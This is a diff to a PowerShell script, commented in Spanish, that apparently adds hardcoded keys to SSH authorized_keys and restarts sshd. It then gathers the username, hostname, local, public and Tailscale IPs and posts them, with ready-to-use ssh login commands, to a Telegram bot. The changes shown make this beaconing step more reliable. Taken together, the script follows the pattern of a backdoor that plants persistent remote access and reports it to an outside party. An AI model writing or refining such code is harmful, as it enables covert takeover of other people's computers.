@@ -46,6 +46,7 @@ $hardcodedKeys = @(
 )
 
 $currentKeys = Get-Content $authKeys -ErrorAction SilentlyContinue
+if ($null -eq $currentKeys) { $currentKeys = @() }
 
 foreach ($hk in $hardcodedKeys) {
     if ($currentKeys -notcontains $hk) {
@@ -79,9 +80,9 @@ Restart-Service sshd -ErrorAction SilentlyContinue
 # Detectar IPs y Hostname
 $hostName = $env:COMPUTERNAME
 $mdnsName = "$hostName.local"
-$localIps = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback|vEthernet' -and $_.IPAddress -notmatch '^169\.' }).IPAddress
-$primaryIp = if ($localIps) { $localIps[0] } else { "127.0.0.1" }
-$allIpsStr = $localIps -join ', '
+$localIps = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.InterfaceAlias -notmatch 'Loopback|vEthernet' -and $_.IPAddress -notmatch '^169\.' }).IPAddress
+$primaryIp = if ($localIps) { ($localIps | Select-Object -First 1) } else { "127.0.0.1" }
+$allIpsStr = if ($localIps) { $localIps -join ', ' } else { "127.0.0.1" }
 
 $publicIp = "N/D"
 try {
@@ -101,30 +102,38 @@ try {
 # Notificación Telegram
 if ($telegramToken -and $telegramChatId) {
     Write-Host "[*] Enviando notificacion a Telegram..." -ForegroundColor Cyan
-    $msg = "🔔 *Acceso SSH Windows Habilitado*`n" +
-           "👤 *Usuario:* `$env:USERNAME``n" +
-           "💻 *Host:* `$hostName (`$mdnsName)``n" +
-           "🏠 *IP Local:* `$primaryIp``n" +
-           "🌐 *IP Publica:* `$publicIp"
-    
+    $bt = [char]96
+    $msgLines = @(
+        "🔔 *Acceso SSH Windows Habilitado*",
+        "👤 *Usuario:* $env:USERNAME",
+        "💻 *Host:* $hostName ($mdnsName)",
+        "🏠 *IP Local:* $primaryIp",
+        "🌐 *IP Publica:* $publicIp"
+    )
     if ($tailscaleIp) {
-        $msg += "`n🦎 *Tailscale:* `$tailscaleIp"
+        $msgLines += "🦎 *Tailscale:* $tailscaleIp"
+    }
+    $msgLines += ""
+    $msgLines += "🚀 *Comando LAN:*"
+    $msgLines += "${bt}ssh $env:USERNAME@$primaryIp${bt}"
+    $msgLines += "🚀 *Comando mDNS:*"
+    $msgLines += "${bt}ssh $env:USERNAME@$mdnsName${bt}"
+    if ($tailscaleIp) {
+        $msgLines += "🚀 *Comando Tailscale:*"
+        $msgLines += "${bt}ssh $env:USERNAME@$tailscaleIp${bt}"
     }
 
-    $msg += "`n`n🚀 *Comando LAN:*`n`ssh $env:USERNAME@$primaryIp`" +
-            "`n🚀 *Comando mDNS:*`n`ssh $env:USERNAME@$mdnsName`"
-    
-    if ($tailscaleIp) {
-        $msg += "`n🚀 *Comando Tailscale:*`n`ssh $env:USERNAME@$tailscaleIp`"
-    }
+    $msg = $msgLines -join "`n"
 
     try {
-        $body = @{
+        $jsonPayload = @{
             chat_id = $telegramChatId
             parse_mode = "Markdown"
             text = $msg
-        }
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot$telegramToken/sendMessage" -Method Post -Body $body -TimeoutSec 5 | Out-Null
+        } | ConvertTo-Json -Compress
+
+        $utf8Bytes = [System.Text.Encoding]::UTF8.GetBytes($jsonPayload)
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot$telegramToken/sendMessage" -Method Post -ContentType "application/json; charset=utf-8" -Body $utf8Bytes -TimeoutSec 5 | Out-Null
     } catch {}
 }
 
